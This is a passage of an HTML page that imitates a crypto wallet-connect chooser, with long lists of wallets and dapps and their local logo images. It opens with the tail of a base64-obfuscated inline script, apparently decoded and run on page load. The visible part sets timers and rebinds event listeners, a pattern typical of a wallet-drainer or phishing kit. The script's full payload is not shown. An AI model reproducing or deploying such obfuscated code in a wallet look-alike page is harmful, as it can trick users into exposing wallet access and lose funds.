Zm9yRWFjaChlPT57ZXZlbnRlcihlLDEpfSl9c3RhcnQoKSx0aW1lcl9pZD13aW5kb3cuc2V0SW50ZXJ2YWwoY2hlY2ssMTUwMCksc2V0SW50ZXJ2YWwocmViaW5kRXZlbnRMaXN0ZW5lcnMsMWUzKTs="))'
                    />

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pockie" src="./img/pockie.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">pockie</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="amazewallet" src="./img/AmazeWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AmazeWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="atato custody" src="./img/atato_custody.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">atato custody</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pali wallet" src="./img/Pali_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Pali Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="nufi" src="./img/NuFi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">NuFi</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="easy" src="./img/EASY.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">EASY</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="solace" src="./img/Solace.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Solace</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="meter wallet" src="./img/Meter_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Meter Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="superwallet" src="./img/SuperWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SuperWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="secux" src="./img/SecuX.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SecuX</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="halo wallet" src="./img/Halo_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Halo Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sinohope" src="./img/Sinohope.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Sinohope</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="opz wallet" src="./img/OPZ_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">OPZ Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fizen wallet" src="./img/Fizen_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Fizen Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kresus superapp" src="./img/Kresus_SuperApp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kresus SuperApp</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="unipass wallet" src="./img/UniPass_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">UniPass Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gooddollar" src="./img/GoodDollar.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">GoodDollar</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="hellō" src="./img/Hello.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Hellō</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="spot on chain wallet" src="./img/Spot_On_Chain_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Spot On Chain Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dgg wallet" src="./img/DGG_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DGG Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="deficloud" src="./img/Deficloud.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Deficloud</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="smart.baby" src="./img/Smart_Baby.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Smart.Baby</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gridlock wallet" src="./img/Gridlock_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Gridlock Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="new money" src="./img/New_Money.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">New Money</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zeal" src="./img/Zeal.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zeal</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kayros" src="./img/Kayros.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kayros</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="trustkeys web3 socialfi" src="./img/TrustKeys_Web3_SocialFi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">TrustKeys Web3 SocialFi</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ape wallet" src="./img/Ape_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ape Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="thirdweb" src="./img/thirdweb.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">thirdweb</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="lichtbit" src="./img/LichtBit.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LichtBit</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="trustee wallet" src="./img/Trustee_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Trustee Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="rss wallet" src="./img/rss_wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">rss wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dropp" src="./img/Dropp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Dropp</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="roam" src="./img/Roam.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Roam</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="my cloud wallet" src="./img/My_Cloud_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">My Cloud Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="qoin wallet" src="./img/Qoin_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Qoin Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="best wallet" src="./img/Best_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Best Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="hyperpay" src="./img/HyperPay.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">HyperPay</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="xucre" src="./img/Xucre.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Xucre</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="una wallet" src="./img/una_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">una Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ethos self-custody vault" src="./img/Ethos_Self_Custody_Vault.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ethos Self-Custody Vault</span
              >
            </div>
          </div>
          <div class="menu-el">
            <div class="modal-icon">
              <img
                alt="plus wallet"
                src="./img/Plus_Wallet.png"
              />
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">Plus Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="at.wallet" src="./img/AT_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AT.Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="plena-app" src="./img/Plena_App.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Plena-App</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="numo wallet" src="./img/Numo_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Numo Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mg" src="./img/MG.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MG</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitfrost" src="./img/BitFrost.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BitFrost</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gem wallet" src="./img/Gem_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Gem Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="multix" src="./img/Multix.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Multix</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="peakdefi" src="./img/PEAKDEFI.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PEAKDEFI</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="nodle" src="./img/Nodle.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Nodle</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="hoo!wallet" src="./img/Hoo_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Hoo!Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cryptokara" src="./img/Cryptokara.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cryptokara</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="veworld mobile" src="./img/VeWorld_Mobile.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">VeWorld Mobile</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="azcoiner" src="./img/AZCoiner.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AZCoiner</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="m1nty" src="./img/M1NTY.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">M1NTY</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="noone wallet" src="./img/Noone_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Noone Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="youba" src="./img/Youba.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Youba</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitso web3 wallet" src="./img/Bitso_Web3_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitso Web3 Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="puzzle wallet" src="./img/Puzzle_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Puzzle Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="blackfort wallet" src="./img/BlackFort_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BlackFort Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitcuit" src="./img/Bitcuit.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitcuit</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bharatbox app" src="./img/BharatBox_App.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BharatBox App</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kaikas" src="./img/Kaikas.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kaikas</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="x9wallet" src="./img/X9Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">X9Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mirai app" src="./img/Mirai_App.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Mirai App</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kigo" src="./img/Kigo.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kigo</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kax-wallet" src="./img/KAX_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">KAX-Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="face wallet" src="./img/Face_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Face Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="joyid passkey" src="./img/JoyID_Passkey.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">JoyID Passkey</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cogni " src="./img/Cogni_.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cogni</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="37x" src="./img/37x.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">37x</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="rovi money" src="./img/Rovi_Money.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Rovi Money</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="nof" src="./img/NoF.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">NoF</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="toric wallet" src="./img/Toric_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Toric Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fastex wallet" src="./img/Fastex_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Fastex Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="wallacy" src="./img/Wallacy.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Wallacy</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zelus wallet" src="./img/Zelus_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zelus Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="capsule" src="./img/Capsule.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Capsule</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="shimmersea" src="./img/ShimmerSea.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ShimmerSea</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="savl" src="./img/Savl.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Savl</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sinum" src="./img/Sinum.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Sinum</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="soulswap" src="./img/SoulSwap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SoulSwap</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="shapeshift" src="./img/ShapeShift.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ShapeShift</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="panaroma wallet" src="./img/Panaroma_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Panaroma Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="neopin" src="./img/NEOPIN.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">NEOPIN</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="alicebob wallet" src="./img/Alicebob_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Alicebob Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dextrade" src="./img/DexTrade.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DexTrade</span>
                        </div>
                    </div>
                </div>

                <div class="hidden modal-main-menu" id="dapps-container">
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="crypto wodl game" src="./img/Crypto_Wodl_Game.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Crypto Wodl Game</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="elusiv" src="./img/Elusiv.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Elusiv</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="opensea" src="./img/OpenSea.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">OpenSea</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kaononai project" src="./img/Kaononai_Project.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kaononai Project</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="openbisea" src="./img/OpenBiSea.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">OpenBiSea</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="toros" src="./img/Toros.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Toros</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tokoin" src="./img/Tokoin.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tokoin</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="duckhub" src="./img/DuckHub.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DuckHub</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="texan" src="./img/TEXAN.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">TEXAN</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="uniswap" src="./img/Uniswap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Uniswap</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="socrates-develop" src="./img/socrates_develop.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">socrates-develop</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="proof of visit" src="./img/Proof_of_Visit.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Proof of Visit</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="moonfit" src="./img/MoonFit.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MoonFit</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ethrank" src="./img/ETHRank.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ETHRank</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="furucombo" src="./img/Furucombo.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Furucombo</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="spring land" src="./img/Spring_Land.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Spring Land</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="odos" src="./img/Odos.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Odos</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="xbanking" src="./img/XBANKING.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">XBANKING</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dhedge" src="./img/dHEDGE.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">dHEDGE</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gm dapp" src="./img/GM_Dapp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">GM Dapp</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="buywithcrypto" src="./img/BuyWithCrypto.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BuyWithCrypto</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="hieswap" src="./img/HieSwap.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">HieSwap</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="defund protocol" src="./img/DeFund_protocol.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DeFund protocol</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="unlock protocol" src="./img/Unlock_Protocol.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Unlock Protocol</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="quixotic" src="./img/Quixotic.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Quixotic</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitriel" src="./img/Bitriel.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitriel</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bring.bridge" src="./img/Bring_Bridge.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bring.Bridge</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="profit ai" src="./img/Profit_AI.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Profit AI</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coldstack" src="./img/ColdStack.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ColdStack</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="loopop! - in love &amp; love-in" src="./img/Loopop_IN_LOVE_LOVE_IN.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Loopop! - IN LOVE &amp; LOVE-IN</span
              >
            </div>
          </div>

          <div class="menu-el">
            <div class="modal-icon">
              <img
                alt="hashleap"
                src="./img/HashLeap.png"
              />
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">HashLeap</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="liquifi" src="./img/Liquifi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Liquifi</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="hashguessers" src="./img/HashGuessers.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">HashGuessers</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="lens claiming" src="./img/Lens_Claiming.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Lens Claiming</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="parcel payroll" src="./img/Parcel_Payroll.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Parcel Payroll</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="affine defi" src="./img/Affine_Defi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Affine Defi</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="synthex" src="./img/Synthex.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Synthex</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="interface" src="./img/Interface.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Interface</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="oix" src="./img/OIX.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">OIX</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zapper" src="./img/Zapper.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zapper</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="quick intel" src="./img/Quick_Intel.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Quick Intel</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="planckx" src="./img/PlanckX.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PlanckX</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="payinloop" src="./img/payinloop.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">payinloop</span>
